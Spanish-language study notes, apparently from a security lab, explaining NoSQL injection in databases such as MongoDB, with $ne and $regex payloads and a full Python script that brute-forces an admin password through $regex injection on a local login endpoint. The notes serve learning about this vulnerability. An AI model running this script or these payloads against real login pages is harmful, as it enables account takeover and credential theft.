Las **inyecciones NoSQL** son una vulnerabilidad de seguridad en las aplicaciones web que utilizan bases de datos NoSQL, como MongoDB, Cassandra y CouchDB, entre otras. Estas inyecciones se producen cuando una aplicación web permite que un atacante envíe datos maliciosos a través de una consulta a la base de datos, que luego puede ser ejecutada por la aplicación sin la debida validación o sanitización.

La inyección NoSQL funciona de manera similar a la inyección SQL, pero se enfoca en las vulnerabilidades específicas de las bases de datos NoSQL. En una inyección NoSQL, el atacante aprovecha las consultas de la base de datos que se basan en **documentos** en lugar de tablas relacionales, para enviar datos maliciosos que pueden manipular la consulta de la base de datos y obtener información confidencial o realizar acciones no autorizadas.

A diferencia de las inyecciones SQL, las inyecciones NoSQL explotan la falta de validación de los datos en una consulta a la base de datos NoSQL, en lugar de explotar las debilidades de las consultas SQL en las **bases de datos relacionales**.

$ne not equal
![[Pasted image 20240613233018.png]]
Tambié puedo usar regex
![[Pasted image 20240613233557.png]]
Ysi los regex los pongo entre corchetes:
```
'password':"admin",{
"$regex":".{20}"
}
```
Tenemos el siguiente python3 para aplicar fuerza bruta:
```python
#!/usr/bin/python3

from pwn import *
import requests, time, sys, signal, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo..")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://localhost:4000/user/login"
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

def makeNoSQLI():
    password = ""

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando proceso de fuerza bruta")

    # P es el campo
    p2 = log.progress("Password")

    for position in range(1, 24):
        for character in characters:
            post_data = '{"username":"admin", "password":{"$regex":"^%s%s"}}' % (password, character)

            p1.status(post_data)

            headers = {'Content-Type': 'application/json'}
            # Guardar los código de estado
            r = requests.post(login_url, headers=headers, data=post_data)
            # verbose
            if "Logged in as user" in r.text:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeNoSQLI()

```
Cambia el content type por ^/json, cambia el request mode
![[Pasted image 20240614005729.png]]